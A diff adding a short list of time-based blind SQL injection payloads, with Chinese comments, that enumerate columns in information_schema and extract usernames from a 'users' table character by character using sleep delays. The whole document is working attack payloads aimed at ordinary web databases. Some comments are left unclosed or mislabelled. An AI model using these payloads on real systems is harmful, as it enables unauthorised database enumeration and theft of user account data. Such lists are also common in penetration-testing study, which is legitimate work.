@@ -1,0 +1,8 @@
+and sleep(if((11=(select count(column_name) from information_schema.columns where table_name="users")),1,2)); /*猜列名个数盲注语句*/
+and sleep(if((ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),7,1))),1,4)); /*猜解列名长度*/
+and sleep(if((ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),7,1))=117),1,4)); /*猜解列表名称*/
+and sleep(if((13=(select count(username) from users)),1,4)); /*猜解字段长度
+and sleep(if((ascii(substr((select username from users limit 0,1),1,1))),1,4)); /*猜解字段长度*/
+and sleep(if((ascii(substr((select username from users limit 0,1),1,1))=68),1,4)); /*猜解字段名 
+
+
